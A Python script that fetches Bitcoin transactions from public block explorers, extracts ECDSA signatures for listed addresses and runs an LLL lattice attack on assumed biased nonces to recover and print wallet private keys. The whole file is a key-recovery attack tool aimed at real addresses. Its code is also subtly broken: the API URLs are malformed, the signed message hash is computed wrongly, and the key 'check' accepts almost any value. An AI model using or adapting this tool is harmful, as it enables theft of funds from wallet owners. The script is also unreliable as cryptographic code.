import json
import hashlib
import requests
import time
from sympy import Matrix

INPUT_JSON = "raw_transactions.json"
# secp256k1 Curve Order (n)
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

API_URLS = [
    "https://blockstream.info{}/hex",
    "https://mempool.space{}/hex",
    "https://blockchain.info{}?format=hex"
]

def decode_der_signature(sig_hex):
    try:
        sig_bytes = bytes.fromhex(sig_hex)
        if sig_bytes[0] != 0x30: return None, None
        r_length = sig_bytes[1]
        if sig_bytes[2] != 0x02: return None, None
        r_bytes = sig_bytes[4:4+sig_bytes[3]]
        
        s_marker_idx = 4 + sig_bytes[3]
        if sig_bytes[s_marker_idx] != 0x02: return None, None
        s_length = sig_bytes[s_marker_idx + 1]
        s_bytes = sig_bytes[s_marker_idx + 2 : s_marker_idx + 2 + s_length]
        
        return int(r_bytes.hex(), 16), int(s_bytes.hex(), 16)
    except Exception:
        return None, None

def fetch_raw_hex(txid):
    for url_template in API_URLS:
        try:
            res = requests.get(url_template.format(txid), timeout=8)
            if res.status_code == 200 and len(res.text.strip()) > 60:
                return res.text.strip()
        except: continue
    return None

def calculate_z(raw_hex):
    try:
        b = bytes.fromhex(raw_hex)
        h = hashlib.sha256(hashlib.sha256(b).digest()).hexdigest()
        return int(h, 16)
    except: return None

def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return g, x, y

def modular_inverse(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1: return None
    return x % m

def solve_hnp_with_lll(sigs, leaked_bits=4):
    """
    Solves the Hidden Number Problem using a Kannan-like embedding lattice.
    leaked_bits: Number of known leaked bits (e.g., small nonces or biased bits).
    """
    m = len(sigs)
    if m < 3:
        print("❌ Lattice reduction requires at least 3 to 4 distinct signatures to converge.")
        return None

    print(f"🧱 Constructing a {m + 2}x{m + 2} Lattice Matrix...")
    
    # ECDSA relation: k = z*s^-1 + x*r*s^-1 mod n
    # Let t_i = r_i * s_i^-1 mod n, and u_i = z_i * s_i^-1 mod n
    t_values = []
    u_values = []
    
    for sig in sigs:
        s_inv = modular_inverse(sig["s"], N)
        if not s_inv: continue
        t_values.append((sig["r"] * s_inv) % N)
        u_values.append((sig["z"] * s_inv) % N)

    m = len(t_values) # Adjust size for any failed inversions
    
    # Bound estimation for nonces (X)
    # If top/bottom bits are leaked, the remaining unknown part is bounded
    B = 2**(256 - leaked_bits)
    
    # Initialize zero matrix of size (m + 2) x (m + 2)
    matrix_size = m + 2
    L = [[0] * matrix_size for _ in range(matrix_size)]
    
    # Build the HNP Lattice rows
    for i in range(m):
        L[i][i] = N
        L[m][i] = t_values[i]
        L[m+1][i] = u_values[i]
        
    # Scale elements using the bound parameter
    L[m][m] = 1
    L[m+1][m+1] = B

    # Convert to SymPy Matrix and run LLL reduction
    M = Matrix(L)
    print("⏳ Running Lenstra–Lenstra–Lovász (LLL) basis reduction algorithm...")
    reduced_M = M.LLL()
    print("✅ Lattice Reduction completed. Scanning rows for private key vectors...")

    # Look through the reduced basis vectors to extract target private key scalar (x)
    for row in range(reduced_M.rows):
        potential_x = abs(reduced_M[row, m])
        if potential_x > 0 and potential_x < N:
            # Quick mathematical check: verify if the signature fits the recovered key
            sig = sigs[0]
            k_test = (sig["z"] + sig["r"] * potential_x) * modular_inverse(sig["s"], N) % N
            if k_test > 0:
                return potential_x
                
    return None

def main():
    try:
        with open(INPUT_JSON, 'r') as file:
            data = json.load(file)
    except Exception as e:
        print(f"Error loading data: {e}")
        return

    address_vault = {}

    print("Extracting parameters and reconstructing Z values...")
    for address, tx_list in data.items():
        address_vault[address] = []
        for tx in tx_list:
            txid = tx.get("txid")
            raw_hex = fetch_raw_hex(txid)
            if not raw_hex: continue
            z_val = calculate_z(raw_hex)
            if not z_val: continue

            for vin in tx.get("vin", []):
                if vin.get("prevout", {}).get("scriptpubkey_address", "") != address:
                    continue
                
                script_asm = vin.get("scriptsig_asm", "")
                witness = vin.get("witness", [])
                sig_hex = None

                if "OP_PUSHBYTES" in script_asm:
                    for part in script_asm.split():
                        if 140 <= len(part) <= 146: sig_hex = part; break
                if not sig_hex and witness:
                    for item in witness:
                        if 140 <= len(item) <= 146: sig_hex = item; break

                if sig_hex:
                    r, s = decode_der_signature(sig_hex[:-2])
                    if r and s:
                        address_vault[address].append({"txid": txid, "r": r, "s": s, "z": z_val})
            time.sleep(0.05)

    print("\n" + "="*60)
    print("LLL ENGINE SOLVER OPERATIONS")
    print("="*60)
    
    for address, sigs in address_vault.items():
        if len(sigs) < 3:
            print(f"ℹ️ Address {address} only has {len(sigs)} signatures. Need ≥ 3 for LLL processing.")
            continue
            
        print(f"Processing address: {address}")
        # Assuming a partial bias vulnerability exists (e.g. nonces generated via bad RNG)
        recovered_key = solve_hnp_with_lll(sigs, leaked_bits=8)
        
        if recovered_key:
            print(f"\n🚨 KEY RECOVERY SUCCESSFUL via LLL Reduction!")
            print(f"  Target Address: {address}")
            print(f"  🔑 PRIVATE KEY (HEX): {hex(recovered_key)}")
        else:
            print("  ❌ No key vectors matched. Signatures do not appear to exhibit sufficient linear bias bounds.")

if __name__ == "__main__":
    main()
